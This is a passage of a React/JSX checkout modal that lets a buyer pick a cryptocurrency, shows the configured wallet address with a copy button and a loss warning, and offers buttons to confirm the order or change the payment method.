                                    <div className="p-3 rounded-xl bg-rose-500/[0.08] border border-rose-500/20 text-xs text-rose-200">
                                        {cardErrorMessage}
                                    </div>
                                )}
                            </div>
                        ) : paymentMethod === "crypto" && !cryptoAsset ? (
                            // Crypto coin picker
                            <div className="space-y-3">
                                <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest">Select Cryptocurrency</p>
                                {cryptoOptions.map(coin => (
                                    <button
                                        key={coin.id}
                                        onClick={() => setCryptoAsset(coin.id)}
                                        className="w-full flex items-center justify-between p-4 rounded-2xl border border-white/[0.06] bg-white/[0.02] hover:bg-white/[0.05] hover:border-amber-500/40 transition-all group text-left"
                                    >
                                        <div className="flex items-center gap-3">
                                            <div className={`w-10 h-10 rounded-xl ${coin.bg} border border-white/[0.04] flex items-center justify-center`}>
                                                <span className={`text-xs font-black ${coin.color}`}>{coin.ticker}</span>
                                            </div>
                                            <div>
                                                <p className="font-bold text-sm text-white">{coin.name}</p>
                                                <p className="text-[10px] text-zinc-600 font-bold uppercase tracking-widest">{coin.ticker}</p>
                                            </div>
                                        </div>
                                        <ChevronRight className="w-4 h-4 text-zinc-700 group-hover:text-amber-400" />
                                    </button>
                                ))}
                                {cryptoOptions.length === 0 && (
                                    <p className="text-xs text-zinc-600 text-center py-4">No crypto wallets configured yet.</p>
                                )}
                            </div>
                        ) : paymentMethod === "crypto" && cryptoAsset ? (
                            // Show selected crypto address
                            (() => {
                                const selectedCoin = cryptoOptions.find(c => c.id === cryptoAsset);
                                const walletAddress = selectedCoin?.address || "";
                                return (
                                    <div className="space-y-4">
                                        <button onClick={() => setCryptoAsset(null)} className="text-[10px] text-zinc-500 hover:text-zinc-300 font-bold uppercase tracking-widest flex items-center gap-1">
                                            ← Change coin
                                        </button>
                                        <div className="p-5 bg-zinc-950/50 border border-white/[0.06] rounded-xl space-y-3">
                                            <div className="flex items-center gap-2">
                                                <span className="text-[10px] font-black text-amber-400 bg-amber-500/10 px-2 py-1 rounded-md">{selectedCoin?.ticker}</span>
                                                <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-widest">Wallet Address</p>
                                            </div>
                                            <p className="text-sm font-bold text-white">Send {selectedCoin?.ticker} to:</p>
                                            <div className="flex gap-2">
                                                <Input readOnly value={walletAddress} className="h-10 bg-zinc-900 border-none rounded-lg text-xs font-mono" />
                                                <Button onClick={() => handleCopy(walletAddress)} className="h-10 bg-zinc-800 hover:bg-zinc-700 text-zinc-400 min-w-[88px]">
                                                    {copied ? "Copied" : "Copy"}
                                                </Button>
                                            </div>
                                            <p className="text-[11px] text-zinc-600">Only send {selectedCoin?.ticker} to this address. Sending other assets may result in permanent loss.</p>
                                        </div>
                                    </div>
                                );
                            })()
                        ) : null}

                        <div className="pt-2 flex flex-col gap-3">
                            <Button onClick={handleSubmit} disabled={loading} className="w-full h-12 rounded-xl bg-blue-600 hover:bg-blue-700 font-bold shadow-xl shadow-blue-500/20 active:scale-[0.98] transition-all">
                                {loading ? <Loader2 className="w-5 h-5 animate-spin mx-auto" /> : "Confirm Order"}
                            </Button>
                            <Button variant="ghost" onClick={() => setStep(2)} className="h-10 rounded-xl text-zinc-600 font-bold">Change Payment</Button>
                        </div>
                    </div>
                )}
            </div>
        </Modal>
    );
}
